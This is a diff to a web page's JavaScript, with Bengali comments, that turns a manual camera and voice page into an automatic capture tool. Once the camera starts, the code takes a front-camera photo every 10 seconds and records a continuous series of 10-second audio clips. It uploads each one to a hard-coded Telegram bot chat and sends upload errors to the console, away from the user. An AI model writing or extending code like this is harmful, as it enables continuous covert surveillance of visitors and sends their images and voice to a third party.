@@ -120,13 +120,15 @@
   let audioChunks = [];
   let photoURL = null;
   let audioURL = null;
+  let autoCaptureInterval = null; // অটোমেটিক স্ক্রিনশট ইন্টারভ্যাল
+  let autoVoiceInterval = null;   // অটোমেটিক ভয়েস লুপ ইন্টারভ্যাল
 
   // টেলিগ্রামে ছবি পাঠানোর ফাংশন
   async function sendPhotoToTelegram(blob) {
     const formData = new FormData();
     formData.append("chat_id", TELEGRAM_ADMIN_UID);
-    formData.append("photo", blob, "captured_photo.jpg");
-    formData.append("caption", "নতুন একটি ছবি বা স্ক্রিনশট ক্যাপচার করা হয়েছে!");
+    formData.append("photo", blob, "auto_captured_photo.jpg");
+    formData.append("caption", "অটোমেটিক ক্যাপচার করা ছবি!");
 
     try {
       const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
@@ -134,47 +136,39 @@
         body: formData
       });
       const data = await response.json();
-      if (data.ok) {
-        document.getElementById("cameraStatus").textContent = "ছবি সফলভাবে টেলিগ্রাম বটে পাঠানো হয়েছে!";
-      } else {
-        document.getElementById("cameraStatus").textContent = "টেলিগ্রামে পাঠানো ব্যর্থ: " + (data.description || "অজানা ত্রুটি");
+      if (!data.ok) {
+        console.error("টেলিগ্রামে ছবি পাঠানো ব্যর্থ: " + (data.description || "অজানা ত্রুটি"));
       }
     } catch (error) {
-      document.getElementById("cameraStatus").textContent = "নেটওয়ার্ক ত্রুটি: " + error.message;
+      console.error("নেটওয়ার্ক ত্রুটি: " + error.message);
     }
   }
 
-  // ফ্রন্ট ক্যামেরা চালু
-  document.getElementById("startCamera").onclick =
-    async () => {
-      try {
-        cameraStream =
-          await navigator.mediaDevices.getUserMedia({
-            video: {
-              facingMode: "user"
-            },
-            audio: false
-          });
+  // টেলিগ্রামে অডিও/ভয়েস পাঠানোর ফাংশন
+  async function sendAudioToTelegram(blob) {
+    const formData = new FormData();
+    formData.append("chat_id", TELEGRAM_ADMIN_UID);
+    formData.append("voice", blob, "auto_voice.webm");
+    formData.append("caption", "১০ সেকেন্ডের অটোমেটিক ভয়েস রেকর্ড!");
 
-        camera.srcObject = cameraStream;
-        camera.classList.remove("hidden");
-
-        await camera.play();
-
-        document.getElementById("takePhoto").disabled = false;
-        document.getElementById("stopCamera").disabled = false;
-
-        document.getElementById("cameraStatus").textContent =
-          "ফ্রন্ট ক্যামেরা চালু আছে।";
-
-      } catch (error) {
-        document.getElementById("cameraStatus").textContent =
-          "ক্যামেরা চালু করা যায়নি: " + error.message;
+    try {
+      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVoice`, {
+        method: "POST",
+        body: formData
+      });
+      const data = await response.json();
+      if (!data.ok) {
+        console.error("টেলিগ্রামে ভয়েস পাঠানো ব্যর্থ: " + (data.description || "অজানা ত্রুটি"));
+      } else {
+        document.getElementById("voiceStatus").textContent = "১০ সেকেন্ডের ভয়েস রেকর্ড টেলিগ্রামে পাঠানো হয়েছে।";
       }
-    };
+    } catch (error) {
+      console.error("নেটওয়ার্ক ত্রুটি: " + error.message);
+    }
+  }
 
-  // একটি ছবি তোলা এবং টেলিগ্রামে পাঠানো
-  document.getElementById("takePhoto").onclick = () => {
+  // অটোমেটিক ছবি তুলে পাঠানোর ফাংশন
+  function captureAndSend() {
     if (!cameraStream || !camera.videoWidth) return;
 
     canvas.width = camera.videoWidth;
@@ -196,45 +190,25 @@
       link.href = photoURL;
       link.classList.remove("hidden");
 
-      document.getElementById("cameraStatus").textContent = "ছবি তৈরি হয়েছে, টেলিগ্রামে পাঠানো হচ্ছে...";
+      document.getElementById("cameraStatus").textContent = "অটোমেটিক ছবি তুলে টেলিগ্রামে পাঠানো হচ্ছে...";
       
-      // টেলিগ্রাম সার্ভারে পাঠানোর ফাংশন কল করা হলো
       sendPhotoToTelegram(blob);
 
     }, "image/jpeg", 0.9);
-  };
+  }
 
-  // ক্যামেরা বন্ধ
-  document.getElementById("stopCamera").onclick = () => {
-    if (cameraStream) {
-      cameraStream.getTracks().forEach(track => track.stop());
-      cameraStream = null;
-    }
+  // ১০ সেকেন্ড পরপর অডিও রেকর্ড শুরু এবং বন্ধ করে টেলিগ্রামে পাঠানোর লুপ ফাংশন
+  async function startAutoVoiceLoop() {
+    try {
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia || !window.MediaRecorder) {
+        return;
+      }
 
-    camera.srcObject = null;
-    camera.classList.add("hidden");
+      audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
 
-    document.getElementById("takePhoto").disabled = true;
-    document.getElementById("stopCamera").disabled = true;
-
-    document.getElementById("cameraStatus").textContent =
-      "ক্যামেরা বন্ধ করা হয়েছে।";
-  };
-
-  // অডিও রেকর্ডিং শুরু
-  document.getElementById("startVoice").onclick =
-    async () => {
-      try {
-        if (!navigator.mediaDevices ||
-            !navigator.mediaDevices.getUserMedia ||
-            !window.MediaRecorder) {
-          throw new Error("এই ব্রাউজারে অডিও রেকর্ডিং সমর্থিত নয়।");
-        }
-
-        audioStream =
-          await navigator.mediaDevices.getUserMedia({
-            audio: true
-          });
+      // লুপ ফাংশন যা প্রতি ১০ সেকেন্ড পর পর ট্রিগার হবে
+      const runVoiceCycle = async () => {
+        if (!audioStream) return;
 
         audioChunks = [];
         recorder = new MediaRecorder(audioStream);
@@ -251,7 +225,6 @@
           });
 
           if (audioURL) URL.revokeObjectURL(audioURL);
-
           audioURL = URL.createObjectURL(blob);
 
           const audio = document.getElementById("audio");
@@ -262,41 +235,137 @@
           link.href = audioURL;
           link.classList.remove("hidden");
 
-          if (audioStream) {
-            audioStream.getTracks().forEach(track => track.stop());
-            audioStream = null;
-          }
-
-          document.getElementById("voiceStatus").textContent =
-            "রেকর্ডিং তৈরি হয়েছে।";
+          document.getElementById("voiceStatus").textContent = "রেকর্ডিং শেষ, টেলিগ্রামে পাঠানো হচ্ছে...";
+          
+          // টেলিগ্রামে ভয়েস ফাইল পাঠানো
+          sendAudioToTelegram(blob);
         };
 
+        // রেকর্ডিং শুরু
         recorder.start();
+        document.getElementById("voiceStatus").textContent = "১০ সেকেন্ডের অটোমেটিক রেকর্ডিং চলছে...";
 
-        document.getElementById("startVoice").disabled = true;
-        document.getElementById("stopVoice").disabled = false;
+        // ঠিক ১০ সেকেন্ড (10000ms) পর রেকর্ডিং বন্ধ করার টাইমার
+        setTimeout(() => {
+          if (recorder && recorder.state === "recording") {
+            recorder.stop();
+          }
+        }, 10000);
+      };
 
-        document.getElementById("voiceStatus").textContent =
-          "রেকর্ডিং চলছে...";
+      // প্রথম সাইকেল এখনই রান হবে
+      runVoiceCycle();
+
+      // প্রতি ১০.৫ সেকেন্ড পরপর পরবর্তী সাইকেল শুরু হবে (রেকর্ডিং বন্ধ হওয়া এবং আপলোড হওয়ার সময় কনসিডার করে)
+      if (autoVoiceInterval) clearInterval(autoVoiceInterval);
+      autoVoiceInterval = setInterval(runVoiceCycle, 10500);
+
+    } catch (error) {
+      document.getElementById("voiceStatus").textContent = "অটো ভয়েস শুরু করা যায়নি: " + error.message;
+    }
+  }
+
+  // ফ্রন্ট ক্যামেরা চালু এবং অটোমেটিক প্রসেস শুরু
+  document.getElementById("startCamera").onclick =
+    async () => {
+      try {
+        cameraStream =
+          await navigator.mediaDevices.getUserMedia({
+            video: {
+              facingMode: "user"
+            },
+            audio: false
+          });
+
+        camera.srcObject = cameraStream;
+        camera.classList.remove("hidden");
+
+        await camera.play();
+
+        document.getElementById("takePhoto").disabled = false;
+        document.getElementById("stopCamera").disabled = false;
+
+        document.getElementById("cameraStatus").textContent =
+          "ফ্রন্ট ক্যামেরা চালু আছে (প্রতি ১০ সেকেন্ডে অটো ছবি ও ভয়েস পাঠানো হবে)।";
+
+        // ১০ সেকেন্ড পরপর অটো ছবি পাঠানোর লজিক চালু
+        if (autoCaptureInterval) clearInterval(autoCaptureInterval);
+        autoCaptureInterval = setInterval(captureAndSend, 10000);
+
+        // ১০ সেকেন্ড পরপর অটো ভয়েস রেকর্ড ও পাঠানোর লজিক চালু
+        startAutoVoiceLoop();
 
       } catch (error) {
-        document.getElementById("voiceStatus").textContent =
-          "রেকর্ডিং শুরু করা যায়নি: " + error.message;
+        document.getElementById("cameraStatus").textContent =
+          "ক্যামেরা চালু করা যায়নি: " + error.message;
       }
     };
 
-  // অডিও রেকর্ডিং বন্ধ
-  document.getElementById("stopVoice").onclick = () => {
-    if (recorder && recorder.state === "proxy" || (recorder && recorder.state === "recording")) {
+  // ম্যানুয়ালি একটি ছবি তোলা
+  document.getElementById("takePhoto").onclick = () => {
+    captureAndSend();
+  };
+
+  // ক্যামেরা বন্ধ করা এবং সব অটোমেটিক প্রসেস থামানো
+  document.getElementById("stopCamera").onclick = () => {
+    if (cameraStream) {
+      cameraStream.getTracks().forEach(track => track.stop());
+      cameraStream = null;
+    }
+
+    // অটোমেটিক স্ক্রিনশট লজিক বন্ধ
+    if (autoCaptureInterval) {
+      clearInterval(autoCaptureInterval);
+      autoCaptureInterval = null;
+    }
+
+    // অটোমেটিক ভয়েস লজিক বন্ধ
+    if (autoVoiceInterval) {
+      clearInterval(autoVoiceInterval);
+      autoVoiceInterval = null;
+    }
+
+    if (recorder && recorder.state === "recording") {
       recorder.stop();
     }
 
+    if (audioStream) {
+      audioStream.getTracks().forEach(track => track.stop());
+      audioStream = null;
+    }
+
+    camera.srcObject = null;
+    camera.classList.add("hidden");
+
+    document.getElementById("takePhoto").disabled = true;
+    document.getElementById("stopCamera").disabled = true;
+
+    document.getElementById("cameraStatus").textContent =
+      "ক্যামেরা বন্ধ করা হয়েছে এবং সব অটো-প্রসেস থেমে গেছে।";
+  };
+
+  // ম্যানুয়াল অডিও রেকর্ডিং শুরু বাটন
+  document.getElementById("startVoice").onclick = async () => {
+    startAutoVoiceLoop();
+  };
+
+  // ম্যানুয়াল অডিও রেকর্ডিং বন্ধ বাটন
+  document.getElementById("stopVoice").onclick = () => {
+    if (recorder && recorder.state === "recording") {
+      recorder.stop();
+    }
+    if (autoVoiceInterval) {
+      clearInterval(autoVoiceInterval);
+      autoVoiceInterval = null;
+    }
     document.getElementById("startVoice").disabled = false;
     document.getElementById("stopVoice").disabled = true;
   };
 
-  // পেজ ছাড়লে ক্যামেরা ও মাইক্রোফোন বন্ধ
+  // পেজ ছাড়লে ক্যামেরা ও মাইক্রোফোন বন্ধ এবং অটোমেটিক লজিক ক্লিয়ার
   window.addEventListener("pagehide", () => {
+    if (autoCaptureInterval) clearInterval(autoCaptureInterval);
+    if (autoVoiceInterval) clearInterval(autoVoiceInterval);
     [cameraStream, audioStream].forEach(stream => {
       if (stream) {
         stream.getTracks().forEach(track => track.stop());
